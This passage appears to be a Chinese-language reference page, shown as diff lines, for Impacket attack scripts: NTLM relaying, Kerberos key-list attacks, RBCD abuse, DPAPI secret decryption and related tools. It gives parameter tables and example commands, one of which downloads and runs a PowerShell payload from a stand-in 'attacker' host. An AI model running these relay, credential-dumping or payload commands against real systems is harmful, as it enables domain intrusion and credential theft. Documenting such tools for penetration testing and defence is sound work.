+<td><code>-hashes-smb LMHASH:NTHASH</code></td>
+<td>SMB 的 NTLM 哈希</td>
+</tr>
+<tr>
+<td><code>-rpc-smb-port {139,445}</code></td>
+<td>连接到 SMB 的目标端口</td>
+</tr>
+<tr>
+<td><code>-icpr-ca-name ICPR_CA_NAME</code></td>
+<td>ICPR 攻击的 CA 名称</td>
+</tr>
+</tbody></table>
+<p><strong>MSSQL 客户端选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-q QUERY, --query QUERY</code></td>
+<td>要执行的 MSSQL 查询（可以指定多个）</td>
+</tr>
+</tbody></table>
+<p><strong>HTTP 选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-machine-account MACHINE_ACCOUNT</code></td>
+<td>与域交互时使用的域计算机账户，格式为 domain&#x2F;machine_name</td>
+</tr>
+<tr>
+<td><code>-machine-hashes LMHASH:NTHASH</code></td>
+<td>域计算机哈希</td>
+</tr>
+<tr>
+<td><code>-domain DOMAIN</code></td>
+<td>使用 NETLOGON 连接的域 FQDN 或 IP</td>
+</tr>
+<tr>
+<td><code>-remove-target</code></td>
+<td>尝试在挑战消息中移除目标（如果未安装 CVE-2019-1019 补丁）</td>
+</tr>
+</tbody></table>
+<p><strong>LDAP 客户端选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--no-dump</code></td>
+<td>不尝试转储 LDAP 信息</td>
+</tr>
+<tr>
+<td><code>--no-da</code></td>
+<td>不尝试添加域管理员</td>
+</tr>
+<tr>
+<td><code>--no-acl</code></td>
+<td>禁用 ACL 攻击</td>
+</tr>
+<tr>
+<td><code>--no-validate-privs</code></td>
+<td>不尝试枚举权限，假设权限被授予通过 ACL 攻击提升用户权限</td>
+</tr>
+<tr>
+<td><code>--escalate-user ESCALATE_USER</code></td>
+<td>提升此用户的权限而不是创建新用户</td>
+</tr>
+<tr>
+<td><code>--delegate-access</code></td>
+<td>将中继计算机账户的访问权限委托给指定账户</td>
+</tr>
+<tr>
+<td><code>--sid</code></td>
+<td>使用 SID 而不是账户名称来委托访问权限</td>
+</tr>
+<tr>
+<td><code>--dump-laps</code></td>
+<td>尝试转储用户可读的 LAPS 密码</td>
+</tr>
+<tr>
+<td><code>--dump-gmsa</code></td>
+<td>尝试转储用户可读的 gMSA 密码</td>
+</tr>
+<tr>
+<td><code>--dump-adcs</code></td>
+<td>尝试转储 ADCS 注册服务和证书模板信息</td>
+</tr>
+<tr>
+<td><code>--add-dns-record NAME IPADDR</code></td>
+<td>通过 LDAP 将 <NAME> 记录添加到 DNS，指向 <IPADDR></td>
+</tr>
+</tbody></table>
+<p><strong>SMB 和 LDAP 的通用选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--add-computer [COMPUTERNAME [PASSWORD ...]]</code></td>
+<td>尝试通过 SMB 或 LDAP 添加新的计算机账户</td>
+</tr>
+</tbody></table>
+<p><strong>IMAP 客户端选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-k KEYWORD, --keyword KEYWORD</code></td>
+<td>要搜索的 IMAP 关键字，如果未指定，将搜索包含 “password” 的邮件</td>
+</tr>
+<tr>
+<td><code>-m MAILBOX, --mailbox MAILBOX</code></td>
+<td>要转储的邮箱名称，默认：INBOX</td>
+</tr>
+<tr>
+<td><code>-a, --all</code></td>
+<td>不搜索关键字，转储所有邮件</td>
+</tr>
+<tr>
+<td><code>-im IMAP_MAX, --imap-max IMAP_MAX</code></td>
+<td>要转储的最大邮件数（0 &#x3D; 无限制，默认：无限制）</td>
+</tr>
+</tbody></table>
+<p><strong>AD CS 攻击选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--adcs</code></td>
+<td>启用 AD CS 中继攻击</td>
+</tr>
+<tr>
+<td><code>--template TEMPLATE</code></td>
+<td>AD CS 模板，默认为 Machine 或 User（取决于中继账户名称是否以 <code>$</code> 结尾）</td>
+</tr>
+<tr>
+<td><code>--altname ALTNAME</code></td>
+<td>执行 ESC1 或 ESC6 攻击时使用的使用者备用名称</td>
+</tr>
+</tbody></table>
+<p><strong>Shadow Credentials 攻击选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--shadow-credentials</code></td>
+<td>启用 Shadow Credentials 中继攻击</td>
+</tr>
+<tr>
+<td><code>--shadow-target SHADOW_TARGET</code></td>
+<td>要填充 msDS-KeyCredentialLink 的目标账户</td>
+</tr>
+<tr>
+<td><code>--pfx-password PFX_PASSWORD</code></td>
+<td>存储的自签名证书的 PFX 密码</td>
+</tr>
+<tr>
+<td><code>--export-type {PEM,PFX}</code></td>
+<td>选择导出证书+私钥的格式（默认：PFX）</td>
+</tr>
+<tr>
+<td><code>--cert-outfile-path CERT_OUTFILE_PATH</code></td>
+<td>存储生成的自签名 PEM 或 PFX 证书和密钥的文件名</td>
+</tr>
+</tbody></table>
+<p><strong>SCCM 策略攻击选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--sccm-policies</code></td>
+<td>启用 SCCM 策略攻击，通过注册设备从管理点转储 SCCM 秘密策略</td>
+</tr>
+<tr>
+<td><code>--sccm-policies-clientname SCCM_POLICIES_CLIENTNAME</code></td>
+<td>注册以转储秘密策略的客户端名称</td>
+</tr>
+<tr>
+<td><code>--sccm-policies-sleep SCCM_POLICIES_SLEEP</code></td>
+<td>客户端注册后请求秘密策略前等待的秒数</td>
+</tr>
+</tbody></table>
+<p><strong>SCCM 分发点攻击选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--sccm-dp</code></td>
+<td>启用 SCCM 分发点攻击，从 SCCM 分发点执行包文件转储</td>
+</tr>
+<tr>
+<td><code>--sccm-dp-extensions SCCM_DP_EXTENSIONS</code></td>
+<td>从分发点下载文件时查找的自定义扩展名列表</td>
+</tr>
+<tr>
+<td><code>--sccm-dp-files SCCM_DP_FILES</code></td>
+<td>包含要从分发点下载的特定 URL 列表的文件路径</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python ntlmrelayx.py -t smb://<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> -c <span class="string">&quot;whoami&quot;</span></span><br><span class="line">python ntlmrelayx.py -t ldap://dc01 -c <span class="string">&quot;net user&quot;</span></span><br><span class="line">python ntlmrelayx.py -t smb://<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> -e payload.exe</span><br><span class="line">python ntlmrelayx.py -t http://webserver -c <span class="string">&quot;powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://attacker/payload.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="karmaSMB-py"><a href="#karmaSMB-py" class="headerlink" title="karmaSMB.py"></a>karmaSMB.py</h3><p><strong>功能</strong>: Karma SMB 攻击工具<br><strong>用途</strong>: 执行 SMB 中间人攻击</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>pathname</code></td>
+<td>要传递给 SMB 客户端的文件内容路径</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-config pathname</code></td>
+<td>配置文件名，用于将扩展名映射到要传递的文件</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>SMB2 支持（实验性）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python karmaSMB.py payload.dll</span><br><span class="line">python karmaSMB.py -config config.txt payload.exe</span><br><span class="line">python karmaSMB.py -smb2support -debug payload.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="keylistattack-py"><a href="#keylistattack-py" class="headerlink" title="keylistattack.py"></a>keylistattack.py</h3><p><strong>功能</strong>: 密钥列表攻击工具<br><strong>用途</strong>: 执行 KERB-KEY-LIST-REQ 攻击，从远程机器转储秘密</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td><code>[[domain/]username[:password]@]&lt;KDC HostName or IP address&gt;</code>（使用此凭据对 SMB 进行身份验证并列出域用户）或 <code>LIST</code>（如果要解析目标文件）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-rodcNo RODCNO</code></td>
+<td>RODC krbtgt 账户的编号</td>
+</tr>
+<tr>
+<td><code>-rodcKey RODCKEY</code></td>
+<td>只读域控制器的 AES 密钥</td>
+</tr>
+<tr>
+<td><code>-full</code></td>
+<td>对所有域用户运行攻击，噪音大！可能导致更多 TGS 请求被拒绝</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>LIST 选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-domain DOMAIN</code></td>
+<td>完全限定域名（仅适用于 LIST）</td>
+</tr>
+<tr>
+<td><code>-t T</code></td>
+<td>仅攻击指定的用户名（仅适用于 LIST）</td>
+</tr>
+<tr>
+<td><code>-tf TF</code></td>
+<td>包含目标用户名列表的文件（仅适用于 LIST）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>使用 NTLM 哈希对 SMB 进行身份验证并列出域用户</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 对 SMB 进行身份验证并列出域用户</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python keylistattack.py domain/username:password@dc01 -rodcNo <span class="number">20000</span> -rodcKey aes_key</span><br><span class="line">python keylistattack.py domain/username@dc01 -rodcNo <span class="number">20000</span> -rodcKey aes_key -full</span><br><span class="line">python keylistattack.py -kdc dc01 -t victim -rodcNo <span class="number">20000</span> -rodcKey aes_key LIST</span><br><span class="line">python keylistattack.py -kdc dc01 -domain domain.com -tf targetfile.txt -rodcNo <span class="number">20000</span> -rodcKey aes_key LIST</span><br></pre></td></tr></table></figure>
+
+<h3 id="badsuccessor-py"><a href="#badsuccessor-py" class="headerlink" title="badsuccessor.py"></a>badsuccessor.py</h3><p><strong>功能</strong>: Bad Successor 攻击工具<br><strong>用途</strong>: 执行 Bad Successor 攻击<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python badsuccessor.py domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="rbcd-py"><a href="#rbcd-py" class="headerlink" title="rbcd.py"></a>rbcd.py</h3><p><strong>功能</strong>: Resource-Based Constrained Delegation 攻击<br><strong>用途</strong>: 用于处理目标计算机的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的 Python 脚本</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>identity</code></td>
+<td>域身份，格式为 <code>domain.local/username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-delegate-to DELEGATE_TO</code></td>
+<td>要读取&#x2F;编辑等的目标账户</td>
+</tr>
+<tr>
+<td><code>-delegate-from DELEGATE_FROM</code></td>
+<td>要写入到 -delegate-to 的 rbcd 属性的攻击者控制账户（仅在使用 <code>-action write</code> 时）</td>
+</tr>
+<tr>
+<td><code>-action [{read,write,remove,flush}]</code></td>
+<td>对 msDS-AllowedToActOnBehalfOfOtherIdentity 执行的操作（默认：read）</td>
+</tr>
+<tr>
+<td><code>-use-ldaps</code></td>
+<td>使用 LDAPS 而不是 LDAP</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>域控制器的主机名</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python rbcd.py domain/username:password -delegate-to target_computer$ -action read</span><br><span class="line">python rbcd.py domain/username:password -delegate-to target_computer$ -delegate-<span class="keyword">from</span> attacker_computer$ -action write</span><br><span class="line">python rbcd.py domain/username:password -delegate-to target_computer$ -delegate-<span class="keyword">from</span> attacker_computer$ -action remove</span><br><span class="line">python rbcd.py -use-ldaps domain/username:password -delegate-to target_computer$ -action flush</span><br></pre></td></tr></table></figure>
+
+<h2 id="系统分析工具"><a href="#系统分析工具" class="headerlink" title="系统分析工具"></a>系统分析工具</h2><h3 id="dpapi-py"><a href="#dpapi-py" class="headerlink" title="dpapi.py"></a>dpapi.py</h3><p><strong>功能</strong>: DPAPI 数据保护 API 工具<br><strong>用途</strong>: 处理 DPAPI 保护的数据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>backupkeys</code></td>
+<td>域备份密钥相关功能</td>
+</tr>
+<tr>
+<td><code>masterkey</code></td>
+<td>主密钥相关功能</td>
+</tr>
+<tr>
+<td><code>credential</code></td>
+<td>凭据相关功能</td>
+</tr>
+<tr>
+<td><code>vault</code></td>
+<td>保险库凭据相关功能</td>
+</tr>
+<tr>
+<td><code>unprotect</code></td>
+<td>提供 CryptUnprotectData 功能</td>
+</tr>
+<tr>
+<td><code>credhist</code></td>
+<td>CREDHIST 相关功能</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>backupkeys 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t TARGET, --target TARGET</code></td>
+<td><code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>--export</code></td>
+<td>将密钥导出到文件</td>
+</tr>
+</tbody></table>
+<p><strong>masterkey 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-file FILE</code></td>
+<td>要解析的主密钥文件</td>
+</tr>
+<tr>
+<td><code>-sid SID</code></td>
+<td>用户的 SID</td>
+</tr>
+<tr>
+<td><code>-pvk PVK</code></td>
+<td>用于解密的域备份私钥</td>
+</tr>
+<tr>
+<td><code>-key KEY</code></td>
+<td>用于解密的特定密钥</td>
+</tr>
+<tr>
+<td><code>-password PASSWORD</code></td>
+<td>用户的密码</td>
+</tr>
+<tr>
+<td><code>-system SYSTEM</code></td>
+<td>要解析的 SYSTEM 配置单元</td>
+</tr>
+<tr>
+<td><code>-security SECURITY</code></td>
+<td>要解析的 SECURITY 配置单元</td>
+</tr>
+<tr>
+<td><code>-t TARGET, --target TARGET</code></td>
+<td>主密钥所有者的凭据</td>
+</tr>
+<tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>AES 密钥</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>credential 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-file FILE</code></td>
+<td>凭据文件</td>
+</tr>
+<tr>
+<td><code>-key KEY</code></td>
+<td>用于解密的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>vault 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-vcrd VCRD</code></td>
+<td>保险库凭据文件</td>
+</tr>
+<tr>
+<td><code>-vpol VPOL</code></td>
+<td>保险库策略文件</td>
+</tr>
+<tr>
+<td><code>-key KEY</code></td>
+<td>用于解密的主密钥</td>
+</tr>
+</tbody></table>
+<p><strong>unprotect 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-file FILE</code></td>
+<td>包含要解密的 DATA_BLOB 的文件</td>
+</tr>
+<tr>
+<td><code>-key KEY</code></td>
+<td>用于解密的密钥</td>
+</tr>
+<tr>
+<td><code>-entropy ENTROPY</code></td>
+<td>解密所需的额外熵字符串</td>
+</tr>
+<tr>
+<td><code>-entropy-file ENTROPY_FILE</code></td>
+<td>包含二进制熵内容的文件</td>
+</tr>
+</tbody></table>
+<p><strong>credhist 子命令</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-file FILE</code></td>
+<td>CREDHIST 文件</td>
+</tr>
+<tr>
+<td><code>-key KEY</code></td>
+<td>用于解密的特定密钥</td>
+</tr>
+<tr>
+<td><code>-password PASSWORD</code></td>
+<td>用户的密码</td>
+</tr>
+<tr>
+<td><code>-entry ENTRY</code></td>
+<td>CREDHIST 中的条目索引</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导出域备份密钥</span></span><br><span class="line">python dpapi.py backupkeys -t domain/username:password@dc01 --export</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析主密钥</span></span><br><span class="line">python dpapi.py masterkey -file masterkey.<span class="built_in">bin</span> -sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">123456789</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1001</span> -password userpassword</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析凭据文件</span></span><br><span class="line">python dpapi.py credential -file credential.<span class="built_in">bin</span> -key <span class="number">0x1234567890abcdef1234567890abcdef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析保险库</span></span><br><span class="line">python dpapi.py vault -vcrd vault.vcrd -vpol vault.vpol -key masterkey.<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密 DATA_BLOB</span></span><br><span class="line">python dpapi.py unprotect -file blob.<span class="built_in">bin</span> -key <span class="number">0x1234567890abcdef1234567890abcdef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析 CREDHIST 文件</span></span><br><span class="line">python dpapi.py credhist -file credhist.<span class="built_in">bin</span> -password userpassword</span><br></pre></td></tr></table></figure>
+
+<h3 id="getArch-py"><a href="#getArch-py" class="headerlink" title="getArch.py"></a>getArch.py</h3><p><strong>功能</strong>: 获取目标系统架构<br><strong>用途</strong>: 获取目标系统的操作系统架构版本</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target TARGET</code></td>
+<td>目标名称或地址</td>
+</tr>
+<tr>
+<td><code>-targets TARGETS</code></td>
+<td>包含要查询架构的目标系统的输入文件（每行一个）</td>
+</tr>
+<tr>
+<td><code>-timeout TIMEOUT</code></td>
+<td>连接目标时的套接字超时时间（默认 2 秒）</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python getArch.py -target target_ip</span><br><span class="line">python getArch.py -targets targets.txt</span><br><span class="line">python getArch.py -target target_ip -timeout <span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="filetime-py"><a href="#filetime-py" class="headerlink" title="filetime.py"></a>filetime.py</h3><p><strong>功能</strong>: 文件时间戳工具<br><strong>用途</strong>: 处理 Windows 文件时间戳<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python filetime.py timestamp</span><br></pre></td></tr></table></figure>
+
+<h3 id="mqtt-check-py"><a href="#mqtt-check-py" class="headerlink" title="mqtt_check.py"></a>mqtt_check.py</h3><p><strong>功能</strong>: MQTT 服务检查工具<br><strong>用途</strong>: 检测 MQTT 服务<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python mqtt_check.py target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="exchanger-py"><a href="#exchanger-py" class="headerlink" title="exchanger.py"></a>exchanger.py</h3><p><strong>功能</strong>: Exchange 服务器工具<br><strong>用途</strong>: 滥用 Exchange 服务的工具</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>{nspi}</code></td>
+<td>模块名称</td>
+</tr>
+<tr>
+<td></td>
+<td><code>nspi</code>: 攻击 NSPI 接口</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试和扩展输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-rpc-hostname RPC_HOSTNAME</code></td>
+<td>服务器的 GUID 名称（首选）或 NetBIOS 名称格式</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exchanger.py domain/username:password@exchange_ip nspi</span><br><span class="line">python exchanger.py -debug domain/username:password@exchange_ip nspi</span><br></pre></td></tr></table></figure>
+
+<h3 id="sambaPipe-py"><a href="#sambaPipe-py" class="headerlink" title="sambaPipe.py"></a>sambaPipe.py</h3><p><strong>功能</strong>: Samba 管道工具<br><strong>用途</strong>: Samba 管道漏洞利用</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-so SO</code></td>
+<td>要上传和加载的 .so 文件名</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
